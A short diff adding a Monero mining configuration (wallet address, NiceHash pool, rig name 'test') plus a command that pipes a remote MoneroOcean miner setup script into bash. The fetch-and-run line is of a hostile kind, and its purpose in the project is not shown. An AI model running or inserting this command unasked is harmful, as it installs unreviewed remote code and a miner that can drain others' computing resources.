@@ -1,0 +1,7 @@
+[RandomX]
+wallet = 48Yue1qJtyS8MaroH743ioj1DMLAn4z38Fw4hpj6Ej4DKiijDcqfmWugUQNDiRoNqyMTeziyPGS1US1GDWuJG9c9GMWS25P
+coin = XMR
+rigName = test
+pool1 = randomxmonero.eu-west.nicehash.com:3380
+
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 48Yue1qJtyS8MaroH743ioj1DMLAn4z38Fw4hpj6Ej4DKiijDcqfmWugUQNDiRoNqyMTeziyPGS1US1GDWuJG9c9GMWS25P
